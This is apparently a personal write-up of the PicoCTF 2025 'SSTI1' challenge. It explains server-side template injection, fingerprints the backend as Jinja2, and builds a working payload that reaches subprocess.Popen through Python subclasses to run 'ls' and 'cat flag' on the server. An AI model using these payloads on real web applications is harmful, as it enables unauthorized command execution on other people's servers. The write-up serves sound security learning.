# SSTI1
This was the first challenge listed in PicoCTF 2025.  It's listed as easy and categorized as a Web Exploitation challenge.

## Description
The Description reads:
> I made a cool website where you can announce whatever you want! Try it out!
> I heard templating is a cool and modular way to build web apps! Check out my website here!
## Hints
There is a single hint that reads:
> Server Side Template Injection

# Challenge
This one was interesting, I hadn't been exposed to Server Side Template Injection (that's what the challenge is about in case the hint and title didn't make it clear).
There was a lot of trial and error with this one before finally getting the flag and a lot of research trying to understand how templating works.  As always starting with a little googling can't hurt!

## What is SSTI?
But first, what exactly is SSTI?

Portswigger defines SSTI as "when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side".  

Ok well that doesn't help too much does it!  Essentially, on the server side of things, a "template engine" runs on one of several different frameworks (some examples include Twig and Jinja2).  These template engines will take in data, process it, and then display the already processed data to the user.  Think of it like email templates, you create a template that may look similar to the below:

> Hello {{person}},  
> Welcome to our company!  
> It's a pleasure to have you on board {{person}}!  
> Sincerely,  
> Bossman

You can generally configure your email client to send such an email using the template and actual names to replace the "person" variable.  With SSTI, if the template processing is done on the remote server rather than locally, template injection can be done to potentially run payloads on the remote server as these template injections will interpret the text provided to it by default.

## Solving

### Is it SSTI?
A short search later I found some solid info on Github [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).

Essentially the first step in figuring out your payload is that you need to determine what backend framework is being used.  This can be done by entering in various strings to try to get the server to error out, different frameworks have different triggers.

The catch-all to determine if a vulnerability exists at all should be this string:

```
${{<%[%'"}}%\.
```
In most applications this will trigger some sort of error.

Lets take a look at our web page and source code:

![Webpage & Sourcecode](https://github.com/user-attachments/assets/6c675348-63a2-43ae-ba09-682b6e3d2808)

We have a single entry field with an ok button that sends an HTTP Post request to '/' with the user provided value assigned to the "content" variable.

Below we can see that this is indeed the case, the server is sent the user's input and the response is a blank web page that displays the user's text:

![User Announcement](https://github.com/user-attachments/assets/2ef90560-e49a-457c-831c-fe176092bec8)

Ok cool, let's give that SSTI string a try and see what we get:

![Internal Server Error](https://github.com/user-attachments/assets/5c6e31e2-df6d-462b-809b-f1b2789a8ee0)

Sure looks like it may be vulnerable to SSTI!  

### Determining the Framework

Next step is determining which framework is in use in the backend, the below flowchart was very helpful in determining this:

![SSTI Flowchart](https://github.com/user-attachments/assets/8b9f8665-25d2-470d-990c-1ff78cf2658b)

After trying a few out, we got some results that indicate it could either be Jinja2 or Twig which we determined by uing the string "{{7*'7'}}}" which these two frameworks will interpret as printing the character '7', 7 times:

![image](https://github.com/user-attachments/assets/44293168-aefd-4516-acfd-abe06ae8d807)

You can use [this](https://cheatsheet.hackmanit.de/template-injection-table/) really helpful site to help continue to narrow down which one it is.

Using the above site, I found the below string which would cause Twig to output '1' and Jinja2 to output 'True':

```
{{1in[1]}}
```

And sure enough it seems to be Jinja2:

![Jinja2 Confirmation](https://github.com/user-attachments/assets/da0e89b4-3467-4e92-9754-4dd9482f9574)

### Developing the Payload

Ok now that we've narrowed down the template engine we can begin crafting our payload.  A simple google search leads us to some interesting results, [this](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html) one gave the best explanation of how Jinja2 can be vulnerable to SSTI.

It's a little complicated, but python has some sneaky built in variables that help it to run.  By default, Jinja templates have access to the below objects which will be those sneaky variables I mentioned:

```
[]
''
()
dict
config
request
```

You can test those out by wrapping them in {{ }} and making sure to leave spaces.  Our goal with these objects is to navigate to a point where we can import functions that will allow us to interact with the server.  The same site has some fantastic info about bypassing this kind of thing [here](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html).

So, there's realistically a hundred different ways we can do this.  One of the ways is to navigate to pythons '__subclasses__' builtin, which will give easy access to a ton of extra functions we can use.  To get that we can use a string similar to this '{{ dict.__base__.__subclasses__() }}' to get output similar to the below, you can see that the os.popen function is available:

![Subclasses Output](![image](https://github.com/user-attachments/assets/88265f16-197f-4420-bb90-777bbe2712f7)

Now we can get the index of that popen function from the list and we can run commands on the server!  I could just tell you where Popen is in the list, but instead I'll demonstrate how I found that out.

I copied the output into a string variable in python, split it by the string ", ", and then searched for "Popen" (see below):

``` python
a = "huge list that didn't import into the list properly".split(", ")
for i in range(len(a)):
    if "Popen" in a[i]:
        print(i)
```

Which yields us: 356.  So if we run the below, we'll finally call the subprocess.Popen method:

```
{{ dict.__base__.__subclasses__()[356] }}
```

We can then pass system commands in like so:

```
{{ dict.__base__.__subclasses__()[356]('ls',shell=True,stdout=-1).communicate()[0].strip() }}
```
And look there's the flag!
![ls Output](https://github.com/user-attachments/assets/fe92f76f-5e1c-44ec-85e4-42dd3510350e)

We can go ahead and print the flag output with the below string:

```
{{ dict.__base__.__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()[0].strip() }}
```

![Flag](https://github.com/user-attachments/assets/4100f857-4a9b-4dee-83e1-e48254bf0752)

Admittedly, when I was actually doing the CTF I simply tested out a bunch of strings until I got the flag, going back through I've been able to understand WHY it worked which hopefully will help other people out in the future!
